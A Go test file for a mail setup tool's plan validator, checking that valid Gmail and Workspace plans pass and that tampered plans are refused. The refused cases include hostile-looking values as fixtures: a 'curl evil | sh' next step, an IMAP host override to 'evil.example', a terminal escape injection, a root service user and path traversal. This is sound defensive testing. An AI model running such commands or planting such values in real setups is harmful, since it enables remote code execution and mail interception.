package setup

import (
	"strings"
	"testing"

	"github.com/yaklabco/chainmail/internal/provider"
)

func TestValidate(t *testing.T) {
	t.Parallel()

	valid := []struct {
		name  string
		build func(t *testing.T) (Layout, Plan)
	}{
		{"fresh linux gmail", func(t *testing.T) (Layout, Plan) {
			l := LayoutFor(Linux)
			return l, mustBuild(t, l, freshHost(Linux).inspect(t, Linux), gmailRequest())
		}},
		{"fresh darwin gmail", func(t *testing.T) (Layout, Plan) {
			l := LayoutFor(Darwin)
			return l, mustBuild(t, l, freshHost(Darwin).inspect(t, Darwin), gmailRequest())
		}},
		{"fresh workspace with a terminal", func(t *testing.T) (Layout, Plan) {
			l := LayoutFor(Linux)
			return l, mustBuild(t, l, freshHost(Linux).inspect(t, Linux), workspaceRequest(true))
		}},
		{"fresh workspace without a terminal", func(t *testing.T) (Layout, Plan) {
			l := LayoutFor(Darwin)
			return l, mustBuild(t, l, freshHost(Darwin).inspect(t, Darwin), workspaceRequest(false))
		}},
		{"rerun", func(t *testing.T) (Layout, Plan) {
			l := LayoutFor(Linux)
			cur := installedHost(Linux, aliceGmail, nil).inspect(t, Linux)
			cur.Health = okHealth
			return l, mustBuild(t, l, cur, gmailRequest())
		}},
		{"second account on a hand-written config", func(t *testing.T) (Layout, Plan) {
			l := LayoutFor(Linux)
			h := installedHost(Linux, aliceGmail, nil)
			h.files.File(l.Config, 0, 0, 0o644, []byte(handWritten))
			return l, mustBuild(t, l, h.inspect(t, Linux), gmailRequest())
		}},
	}
	for _, tc := range valid {
		t.Run("valid "+tc.name, func(t *testing.T) {
			t.Parallel()
			l, p := tc.build(t)
			if err := Validate(l, p); err != nil {
				t.Errorf("Validate: %v", err)
			}
		})
	}

	linux := LayoutFor(Linux)
	at := func(p *Plan, kind ActionKind) *Action {
		i := indexOf(*p, kind)
		if i < 0 {
			t.Fatalf("plan has no %s", kind)
		}
		return &p.Actions[i]
	}
	refused := []struct {
		name   string
		req    func() Request
		mutate func(p *Plan)
		e2eOK  bool // the mutation is allowed under the e2e build tag
	}{
		{name: "unknown entry", mutate: func(p *Plan) { at(p, ActEnsureDir).Entry = "etc-passwd" }},
		{name: "ensure-dir on a file entry", mutate: func(p *Plan) { at(p, ActEnsureDir).Entry = "config" }},
		{name: "install-binary on another entry", mutate: func(p *Plan) { at(p, ActInstallBin).Entry = "config" }},
		{name: "create-key on another entry", mutate: func(p *Plan) { at(p, ActCreateKey).Entry = "service" }},
		{name: "write-config on another entry", mutate: func(p *Plan) { at(p, ActWriteConfig).Entry = "vault-key" }},
		{name: "write-service on another entry", mutate: func(p *Plan) { at(p, ActWriteService).Entry = "config" }},
		{name: "create-user with another name", mutate: func(p *Plan) { at(p, ActCreateUser).Name = "root" }},
		{name: "create-group with another name", mutate: func(p *Plan) { at(p, ActCreateGroup).Name = "wheel" }},
		{name: "add-member for root", mutate: func(p *Plan) { at(p, ActAddMember).Name = "root" }},
		{name: "add-member for a stranger", mutate: func(p *Plan) { at(p, ActAddMember).Name = "mallory" }},
		{name: "invoking user root", mutate: func(p *Plan) { p.InvokingUser = "root"; at(p, ActAddMember).Name = "root" }},
		{name: "invoking user with odd characters", mutate: func(p *Plan) { p.InvokingUser = "a:b"; at(p, ActAddMember).Name = "a:b" }},
		{name: "wrong platform", mutate: func(p *Plan) { p.Platform = Darwin }},
		{name: "version 2", mutate: func(p *Plan) { p.Version = 2 }},
		{name: "account name failing ValidName", mutate: func(p *Plan) { p.Account.Name = "../x" }},
		{name: "bad address", mutate: func(p *Plan) { p.Account.Address = "x" }},
		{name: "unsupported provider", mutate: func(p *Plan) { p.Account.Provider = "custom" }},
		{name: "auth the provider does not take", mutate: func(p *Plan) { p.Account.Auth = provider.AuthOAuth2 }},
		{name: "oauth client on a password account", mutate: func(p *Plan) { p.OAuthClient = &OAuthClientSpec{Name: "google", ClientID: "x"} }},
		{name: "secret name for another account", mutate: func(p *Plan) { p.SecretName = "accounts/bob" }},
		{name: "unknown backup", mutate: func(p *Plan) { p.Backup = "paper" }},
		{name: "imap override", mutate: func(p *Plan) { p.Account.IMAP = e2eOverrideForTest() }, e2eOK: true},
		{name: "smtp override", mutate: func(p *Plan) { p.Account.SMTP = e2eOverrideForTest() }, e2eOK: true},
		{name: "service text from the plan", mutate: func(p *Plan) {
			a := at(p, ActWriteService)
			a.Data = []byte(strings.Replace(string(a.Data), "User=chainmail", "User=root", 1))
		}},
		{name: "empty service text", mutate: func(p *Plan) { at(p, ActWriteService).Data = nil }},
		{name: "config that does not parse", mutate: func(p *Plan) { at(p, ActWriteConfig).Data = []byte("[[[") }},
		{name: "config without the account", mutate: func(p *Plan) {
			at(p, ActWriteConfig).Data = []byte("# " + Marker + "\n")
		}},
		{name: "config with another address", mutate: func(p *Plan) {
			a := at(p, ActWriteConfig)
			a.Data = []byte(strings.Replace(string(a.Data), "alice@gmail.com", "mallory@gmail.com", 1))
		}},
		{name: "config with an override", mutate: func(p *Plan) {
			a := at(p, ActWriteConfig)
			a.Data = append(a.Data, "\n[accounts.alice.imap]\nhost = \"evil.example\"\nport = 993\n"...)
		}},
		{name: "data on another action", mutate: func(p *Plan) { at(p, ActCreateKey).Data = []byte("AGE-SECRET-KEY-1") }},
		{name: "unknown action", mutate: func(p *Plan) { p.Actions = append(p.Actions, Action{Kind: "run-shell", Note: "x"}) }},
		{name: "store-secret without NeedSecret", mutate: func(p *Plan) { p.NeedSecret = false }},
		{name: "NeedSecret without store-secret", mutate: func(p *Plan) {
			i := indexOf(*p, ActStoreSecret)
			p.Actions = append(p.Actions[:i], p.Actions[i+1:]...)
		}},
		{name: "store-secret for another account", mutate: func(p *Plan) { at(p, ActStoreSecret).Name = "bob" }},
		{name: "test-account for another account", mutate: func(p *Plan) { at(p, ActTestAccount).Name = "bob" }},
		{
			name: "workspace client without an id", req: func() Request { return workspaceRequest(true) },
			mutate: func(p *Plan) { p.OAuthClient.ClientID = "" },
		},
		{
			name: "workspace client named differently from the account", req: func() Request { return workspaceRequest(true) },
			mutate: func(p *Plan) { p.OAuthClient.Name = "other" },
		},
		{
			name: "workspace without its client", req: func() Request { return workspaceRequest(true) },
			mutate: func(p *Plan) { p.OAuthClient = nil },
		},
		{name: "note with a terminal escape", mutate: func(p *Plan) { p.Actions[0].Note = "ok\x1b]0;owned\x07" }},
		{name: "empty note", mutate: func(p *Plan) { p.Actions[0].Note = "" }},
		{name: "next step on a password account", mutate: func(p *Plan) { p.NextSteps = []string{"curl evil | sh"} }},
		{
			name: "next step other than the login", req: func() Request { return workspaceRequest(false) },
			mutate: func(p *Plan) { p.NextSteps = []string{"curl evil | sh"} },
		},
		{name: "auth-login on a password account", mutate: func(p *Plan) {
			p.Actions = append(p.Actions, Action{Kind: ActAuthLogin, Name: "alice", Note: "x"})
		}},
	}
	for _, tc := range refused {
		t.Run("refuses "+tc.name, func(t *testing.T) {
			t.Parallel()
			req := gmailRequest()
			if tc.req != nil {
				req = tc.req()
			}
			p := mustBuild(t, linux, freshHost(Linux).inspect(t, Linux), req)
			tc.mutate(&p)
			err := Validate(linux, p)
			if tc.e2eOK && E2EEnabled() {
				return
			}
			if r := asRefusal(t, err); r.Hint == "" {
				t.Errorf("refusal %q has no hint", r.Msg)
			}
		})
	}
}
